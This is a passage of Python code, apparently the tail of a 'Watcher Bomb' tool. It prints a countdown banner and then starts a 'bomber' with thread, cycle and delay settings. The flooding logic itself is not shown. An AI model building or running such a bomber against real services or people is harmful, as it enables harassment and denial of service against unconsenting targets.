    print(f"\n{R}╔══════════════════════════════════════════════════════╗{RESET}")
    for i in range(5, 0, -1):
        fire = get_fire_line()
        print(f"{R}║{fire}{R}║{RESET}")
        print(f"{R}║{O}            🔥 ARMING Watcher Bomb IN {i}s 🔥{R}             ║{RESET}")
        print(f"{R}║{fire}{R}║{RESET}")
        time.sleep(1)
        if i > 1:
            print("\033[3A\033[K", end="")

    print(f"{R}║{G}                     💣 BOMB ARMED! 💣{R}                       ║{RESET}")
    print(f"{R}╚══════════════════════════════════════════════════════╝{RESET}\n")
    time.sleep(0.5)

    bomber.start(threads=threads, cycles=cycles, delay_between_cycles=delay)

if __name__ == "__main__":
    main()
